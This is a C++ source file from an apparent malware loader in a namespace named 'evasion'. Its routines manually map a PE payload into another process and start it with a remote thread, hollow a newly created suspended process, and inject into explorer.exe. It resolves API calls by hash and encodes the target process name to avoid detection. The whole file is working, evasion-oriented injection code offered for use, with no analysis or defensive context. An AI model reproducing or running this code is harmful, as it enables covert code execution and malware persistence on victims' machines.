#include "Injector.h"
#include "../utils/Logger.h"
#include "../utils/Obfuscator.h"
#include "../utils/ApiHasher.h"
#include <tlhelp32.h>
#include <algorithm>
#include <cwctype>

namespace evasion {

namespace {
    typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, PSIZE_T);
    typedef BOOL(WINAPI* pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
    typedef HANDLE(WINAPI* pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

    struct RELOC_ENTRY {
        WORD Offset : 12;
        WORD Type : 4;
    };
}

bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload, PVOID pParam) {
    (void)pParam;
    auto fVirtualAllocEx = utils::GetProcAddressH<pVirtualAllocEx>("kernel32.dll", H_VirtualAllocEx);
    auto fWriteProcessMemory = utils::GetProcAddressH<pWriteProcessMemory>("kernel32.dll", H_WriteProcessMemory);
    auto fVirtualProtectEx = utils::GetProcAddressH<pVirtualProtectEx>("kernel32.dll", H_VirtualProtectEx);
    auto fCreateRemoteThread = utils::GetProcAddressH<pCreateRemoteThread>("kernel32.dll", H_CreateRemoteThread);

    if (!fVirtualAllocEx || !fWriteProcessMemory || !fVirtualProtectEx || !fCreateRemoteThread) return false;

    PBYTE pSrcData = (PBYTE)payload.data();
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);

    PBYTE pTargetBase = (PBYTE)fVirtualAllocEx(hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pTargetBase) return false;

    std::vector<uint8_t> localMapping(pNtHeaders->OptionalHeader.SizeOfImage);
    PBYTE pLocalBase = localMapping.data();
    memcpy(pLocalBase, pSrcData, pNtHeaders->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (pSectionHeader[i].SizeOfRawData == 0) continue;
        memcpy(pLocalBase + pSectionHeader[i].VirtualAddress, pSrcData + pSectionHeader[i].PointerToRawData, pSectionHeader[i].SizeOfRawData);
    }

    DWORD_PTR delta = (DWORD_PTR)pTargetBase - pNtHeaders->OptionalHeader.ImageBase;
    if (delta != 0) {
        auto& relocDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size > 0) {
            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pLocalBase + relocDir.VirtualAddress);
            while (pReloc->VirtualAddress != 0) {
                DWORD count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD pEntry = (PWORD)(pReloc + 1);
                for (DWORD i = 0; i < count; i++) {
                    if ((pEntry[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                        PDWORD_PTR pAddr = (PDWORD_PTR)(pLocalBase + pReloc->VirtualAddress + (pEntry[i] & 0xFFF));
                        *pAddr += delta;
                    } else if ((pEntry[i] >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                         PDWORD pAddr = (PDWORD)(pLocalBase + pReloc->VirtualAddress + (pEntry[i] & 0xFFF));
                         *pAddr += (DWORD)delta;
                    }
                }
                pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
            }
        }
    }

    if (!fWriteProcessMemory(hProcess, pTargetBase, pLocalBase, pNtHeaders->OptionalHeader.SizeOfImage, NULL)) return false;

    DWORD oldProtect;
    if (!fVirtualProtectEx(hProcess, pTargetBase, pNtHeaders->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, &oldProtect)) return false;

    HANDLE hThread = fCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(pTargetBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint), NULL, 0, NULL);
    if (!hThread) return false;

    CloseHandle(hThread);
    return true;
}

bool Injector::HollowProcess(const std::wstring& targetPath, const std::vector<uint8_t>& payload) {
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    RtlZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    if (!CreateProcessW(NULL, (LPWSTR)targetPath.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return false;
    }

    if (!MapAndInject(pi.hProcess, payload)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    auto fResumeThread = utils::GetProcAddressH<decltype(&ResumeThread)>("kernel32.dll", H_ResumeThread);
    if (fResumeThread) fResumeThread(pi.hThread);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

DWORD Injector::GetProcessIdByName(const std::wstring& processName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnapshot, &pe)) {
            do {
                std::wstring currentProcess = pe.szExeFile;
                std::transform(currentProcess.begin(), currentProcess.end(), currentProcess.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
                std::wstring targetProcess = processName;
                std::transform(targetProcess.begin(), targetProcess.end(), targetProcess.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
                if (currentProcess == targetProcess) { pid = pe.th32ProcessID; break; }
            } while (Process32NextW(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

bool Injector::InjectIntoExplorer(const std::vector<uint8_t>& payload, const std::wstring& dropperPath) {
    (void)dropperPath;
    // "explorer.exe" -> \x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F
    DWORD pid = GetProcessIdByName(utils::DecryptW(L"\x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F"));
    if (pid == 0) return false;

    auto fOpenProcess = utils::GetProcAddressH<decltype(&OpenProcess)>("kernel32.dll", H_OpenProcess);
    if (!fOpenProcess) return false;

    HANDLE hProcess = fOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    bool success = MapAndInject(hProcess, payload);
    CloseHandle(hProcess);
    return success;
}

} // namespace evasion
